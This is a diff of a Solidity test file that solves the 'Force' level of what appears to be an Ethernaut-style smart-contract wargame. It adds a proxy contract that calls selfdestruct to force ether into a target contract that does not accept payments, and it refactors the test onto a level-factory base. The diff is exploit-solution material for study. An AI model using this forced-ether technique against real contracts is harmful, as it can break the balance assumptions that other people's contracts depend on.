@@ -1,40 +1,52 @@
 // SPDX-License-Identifier: MIT
+
 pragma solidity ^0.6.0;
 
-import "tests/Test.sol";
-import "../../src/Force/Level.sol";
-import "../utils/ForceProxy.sol";
-import "forge-std/console.sol";
+contract ForceProxy {
+    receive () external payable {} 
 
-interface IForceProxy {
-    function bruteForce(address payable _contract) external;
+    function bruteForce(address payable _contract) external {
+        selfdestruct(_contract);
+    }
 }
 
-contract ForceTest is Test {
-    address force;
-    IForceProxy forceProxy;
+interface IForceProxy {
+  function bruteForce(address payable _contract) external;
+}
 
-    address deployer = address(100);
-    address attacker = address(101);
+pragma solidity ^0.6.0;
 
-    function setUp() public {
-        vm.prank(deployer); // deploy the contract as deployer
-        force = address(new Force());
-        forceProxy = IForceProxy(address(new ForceProxy()));
-    }
+import {LevelFactory} from "../utils/LevelFactory.sol";
+import {Force} from "../../src/Force/Level.sol";
 
-    function testAttack() public {
-        /* Setup stuff, no need to touch */
-        vm.startPrank(attacker);
-        vm.deal(attacker, 5 ether);
+contract ForceTest is LevelFactory {
+  address force;
+  IForceProxy forceProxy;
 
-        /* Write your code here */
-        payable(address(forceProxy)).transfer(1 ether);
-        forceProxy.bruteForce(payable(force));
-        /* Write your code here */ 
+  function setUp() public {
+    vm.prank(deployer);
+    force = address(new Force());
+    forceProxy = IForceProxy(address(new ForceProxy()));
+  }
 
-        /* Validating the test */
-        assertGt(payable(force).balance, 0);
-    }
+  function testAttack() public {
+    submitLevel("Force");
+  }
+
+  function _performTest() internal override {
+    payable(address(forceProxy)).transfer(1 ether);
+    forceProxy.bruteForce(payable(force));
+  }
+
+  function _setupTest() internal override {
+    super._setupTest();
+    vm.deal(attacker, 5 ether);
+  }
+
+  function _checkTest() internal override returns (bool) {
+    assertGt(force.balance, 0);
+
+    return (force.balance > 0);
+  }
 }
 
